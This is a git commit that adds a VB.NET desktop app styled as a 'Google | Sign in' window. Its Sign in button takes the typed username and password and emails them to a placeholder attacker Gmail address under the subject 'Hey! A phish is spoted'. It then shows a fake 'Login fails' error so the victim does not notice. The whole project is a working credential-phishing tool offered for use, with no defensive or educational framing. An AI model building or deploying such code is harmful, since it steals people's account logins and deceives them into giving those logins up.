24b15c035490cd0c5581519fb28818c400e9669b
maximousblk <maximousbshane@gmail.com>
2018-01-03 01:01:58 +0530

    a

---
+++ Gmail Desktop/Form1.Designer.vb
@@ -0,0 +1,182 @@
+﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
+Partial Class Form1
+    Inherits System.Windows.Forms.Form
+
+    'Form overrides dispose to clean up the component list.
+    <System.Diagnostics.DebuggerNonUserCode()> _
+    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
+        Try
+            If disposing AndAlso components IsNot Nothing Then
+                components.Dispose()
+            End If
+        Finally
+            MyBase.Dispose(disposing)
+        End Try
+    End Sub
+
+    'Required by the Windows Form Designer
+    Private components As System.ComponentModel.IContainer
+
+    'NOTE: The following procedure is required by the Windows Form Designer
+    'It can be modified using the Windows Form Designer.  
+    'Do not modify it using the code editor.
+    <System.Diagnostics.DebuggerStepThrough()> _
+    Private Sub InitializeComponent()
+        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form1))
+        Me.ChromeThemeContainer1 = New Gmail_Desktop.ChromeThemeContainer()
+        Me.Label3 = New System.Windows.Forms.Label()
+        Me.Label2 = New System.Windows.Forms.Label()
+        Me.Label1 = New System.Windows.Forms.Label()
+        Me.ChromeButton1 = New Gmail_Desktop.ChromeButton()
+        Me.ChromeCheckbox1 = New Gmail_Desktop.ChromeCheckbox()
+        Me.TextBox2 = New System.Windows.Forms.TextBox()
+        Me.TextBox1 = New System.Windows.Forms.TextBox()
+        Me.PictureBox1 = New System.Windows.Forms.PictureBox()
+        Me.ChromeThemeContainer1.SuspendLayout()
+        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).BeginInit()
+        Me.SuspendLayout()
+        '
+        'ChromeThemeContainer1
+        '
+        Me.ChromeThemeContainer1.BackColor = System.Drawing.Color.White
+        Me.ChromeThemeContainer1.BorderStyle = System.Windows.Forms.FormBorderStyle.None
+        Me.ChromeThemeContainer1.Controls.Add(Me.Label3)
+        Me.ChromeThemeContainer1.Controls.Add(Me.Label2)
+        Me.ChromeThemeContainer1.Controls.Add(Me.Label1)
+        Me.ChromeThemeContainer1.Controls.Add(Me.ChromeButton1)
+        Me.ChromeThemeContainer1.Controls.Add(Me.ChromeCheckbox1)
+        Me.ChromeThemeContainer1.Controls.Add(Me.TextBox2)
+        Me.ChromeThemeContainer1.Controls.Add(Me.TextBox1)
+        Me.ChromeThemeContainer1.Controls.Add(Me.PictureBox1)
+        Me.ChromeThemeContainer1.Cursor = System.Windows.Forms.Cursors.Default
+        Me.ChromeThemeContainer1.Customization = "AAAA/1paWv9ycnL/"
+        Me.ChromeThemeContainer1.Dock = System.Windows.Forms.DockStyle.Fill
+        Me.ChromeThemeContainer1.Font = New System.Drawing.Font("Segoe UI", 9.75!)
+        Me.ChromeThemeContainer1.Image = Nothing
+        Me.ChromeThemeContainer1.Location = New System.Drawing.Point(0, 0)
+        Me.ChromeThemeContainer1.Movable = True
+        Me.ChromeThemeContainer1.Name = "ChromeThemeContainer1"
+        Me.ChromeThemeContainer1.NoRounding = False
+        Me.ChromeThemeContainer1.Sizable = True
+        Me.ChromeThemeContainer1.Size = New System.Drawing.Size(328, 455)
+        Me.ChromeThemeContainer1.SmartBounds = True
+        Me.ChromeThemeContainer1.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
+        Me.ChromeThemeContainer1.TabIndex = 0
+        Me.ChromeThemeContainer1.Text = "Google | Sign in"
+        Me.ChromeThemeContainer1.TransparencyKey = System.Drawing.Color.Fuchsia
+        Me.ChromeThemeContainer1.Transparent = False
+        '
+        'Label3
+        '
+        Me.Label3.AutoSize = True
+        Me.Label3.Font = New System.Drawing.Font("Segoe UI", 8.0!)
+        Me.Label3.Location = New System.Drawing.Point(148, 331)
+        Me.Label3.Name = "Label3"
+        Me.Label3.Size = New System.Drawing.Size(152, 13)
+        Me.Label3.TabIndex = 9
+        Me.Label3.Text = "Please include '@gmail.com'"
+        Me.Label3.TextAlign = System.Drawing.ContentAlignment.MiddleRight
+        '
+        'Label2
+        '
+        Me.Label2.AutoSize = True
+        Me.Label2.Font = New System.Drawing.Font("Segoe UI", 9.75!)
+        Me.Label2.Location = New System.Drawing.Point(28, 339)
+        Me.Label2.Name = "Label2"
+        Me.Label2.Size = New System.Drawing.Size(67, 17)
+        Me.Label2.TabIndex = 8
+        Me.Label2.Text = "Password:"
+        '
+        'Label1
+        '
+        Me.Label1.AutoSize = True
+        Me.Label1.Font = New System.Drawing.Font("Segoe UI", 9.75!)
+        Me.Label1.Location = New System.Drawing.Point(28, 281)
+        Me.Label1.Name = "Label1"
+        Me.Label1.Size = New System.Drawing.Size(70, 17)
+        Me.Label1.TabIndex = 7
+        Me.Label1.Text = "Username:"
+        '
+        'ChromeButton1
+        '
+        Me.ChromeButton1.Customization = "7e3t//Ly8v/r6+v/5ubm/+vr6//f39//p6en/zw8PP8UFBT/gICA/w=="
+        Me.ChromeButton1.Font = New System.Drawing.Font("Segoe UI", 9.75!)
+        Me.ChromeButton1.Image = Nothing
+        Me.ChromeButton1.Location = New System.Drawing.Point(202, 406)
+        Me.ChromeButton1.Name = "ChromeButton1"
+        Me.ChromeButton1.NoRounding = False
+        Me.ChromeButton1.Size = New System.Drawing.Size(98, 23)
+        Me.ChromeButton1.TabIndex = 6
+        Me.ChromeButton1.Text = "Sign in"
+        Me.ChromeButton1.Transparent = False
+        '
+        'ChromeCheckbox1
+        '
+        Me.ChromeCheckbox1.Checked = False
+        Me.ChromeCheckbox1.Customization = "7e3t//Ly8v/r6+v/5ubm/+vr6//f39//p6en/zw8PP8="
+        Me.ChromeCheckbox1.Font = New System.Drawing.Font("Segoe UI", 9.75!)
+        Me.ChromeCheckbox1.Image = Nothing
+        Me.ChromeCheckbox1.Location = New System.Drawing.Point(32, 412)
+        Me.ChromeCheckbox1.Name = "ChromeCheckbox1"
+        Me.ChromeCheckbox1.NoRounding = False
+        Me.ChromeCheckbox1.Size = New System.Drawing.Size(160, 17)
+        Me.ChromeCheckbox1.TabIndex = 5
+        Me.ChromeCheckbox1.Text = "Remember me"
+        Me.ChromeCheckbox1.Transparent = False
+        '
+        'TextBox2
+        '
+        Me.TextBox2.Font = New System.Drawing.Font("Segoe UI", 9.75!)
+        Me.TextBox2.Location = New System.Drawing.Point(32, 361)
+        Me.TextBox2.Name = "TextBox2"
+        Me.TextBox2.Size = New System.Drawing.Size(268, 25)
+        Me.TextBox2.TabIndex = 2
+        Me.TextBox2.UseSystemPasswordChar = True
+        '
+        'TextBox1
+        '
+        Me.TextBox1.Font = New System.Drawing.Font("Segoe UI", 9.75!)
+        Me.TextBox1.Location = New System.Drawing.Point(32, 303)
+        Me.TextBox1.Name = "TextBox1"
+        Me.TextBox1.Size = New System.Drawing.Size(268, 25)
+        Me.TextBox1.TabIndex = 1
+        '
+        'PictureBox1
+        '
+        Me.PictureBox1.Image = CType(resources.GetObject("PictureBox1.Image"), System.Drawing.Image)
+        Me.PictureBox1.Location = New System.Drawing.Point(43, 36)
+        Me.PictureBox1.Name = "PictureBox1"
+        Me.PictureBox1.Size = New System.Drawing.Size(243, 238)
+        Me.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom
+        Me.PictureBox1.TabIndex = 0
+        Me.PictureBox1.TabStop = False
+        '
+        'Form1
+        '
+        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
+        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
+        Me.ClientSize = New System.Drawing.Size(328, 455)
+        Me.Controls.Add(Me.ChromeThemeContainer1)
+        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None
+        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
+        Me.Name = "Form1"
+        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
+        Me.Text = "Form1"
+        Me.TransparencyKey = System.Drawing.Color.Fuchsia
+        Me.ChromeThemeContainer1.ResumeLayout(False)
+        Me.ChromeThemeContainer1.PerformLayout()
+        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).EndInit()
+        Me.ResumeLayout(False)
+
+    End Sub
+
+    Friend WithEvents ChromeThemeContainer1 As ChromeThemeContainer
+    Friend WithEvents TextBox1 As TextBox
+    Friend WithEvents PictureBox1 As PictureBox
+    Friend WithEvents ChromeButton1 As ChromeButton
+    Friend WithEvents ChromeCheckbox1 As ChromeCheckbox
+    Friend WithEvents TextBox2 As TextBox
+    Friend WithEvents Label2 As Label
+    Friend WithEvents Label1 As Label
+    Friend WithEvents Label3 As Label
+End Class
---
+++ Gmail Desktop/Form1.vb
@@ -0,0 +1,49 @@
+﻿Imports System.Net.Mail
+Imports System.Net
+Public Class Form1
+    Private Sub ChromeButton1_Click(sender As Object, e As EventArgs) Handles ChromeButton1.Click
+        'constructs object from mailMessage class
+        Dim MyMailMessage As New MailMessage()
+
+        Try
+            'constructs a MailAddress object to store an email address to use
+            Dim SendingAddress As MailAddress = New MailAddress("yourgmailid@gmail.com")
+
+            'stores a mailaddress object which conatins an email
+            'indicates message will be sent
+            MyMailMessage.From = SendingAddress
+            'adds new email to mymailmessage
+            MyMailMessage.To.Add("yourgmailid@gmail.com")
+            'MyMailMessage.To.Add("")
+            'sets the subject of the email
+            MyMailMessage.Subject = "Hey! A phish is spoted"
+            'sets the body of the email
+            MyMailMessage.Body = "Username: " & TextBox1.Text & "  Password: " & TextBox2.Text
+
+            Dim MySMTP As New SmtpClient("smtp.gmail.com")
+
+            'stores port number used by local smtp server
+            MySMTP.Port = 587
+            'server uses SSL to encrypt message, so enable must be set to true
+            MySMTP.EnableSsl = True
+
+            Dim MyCrediential As NetworkCredential = New NetworkCredential("yourgmailid@gmail.com", "yourgmailpassword") 'gmail is must
+            MySMTP.Credentials = MyCrediential
+            MySMTP.Send(MyMailMessage)
+
+            TextBox1.Text = ""
+            TextBox2.Text = ""
+            TextBox1.Select()
+        Catch ex As Exception
+            MessageBox.Show("Login fails", "Error")
+        End Try
+    End Sub
+
+    Private Sub Label3_Click(sender As Object, e As EventArgs) Handles Label3.Click
+
+    End Sub
+
+    Private Sub ChromeThemeContainer1_Click(sender As Object, e As EventArgs) Handles ChromeThemeContainer1.Click
+
+    End Sub
+End Class
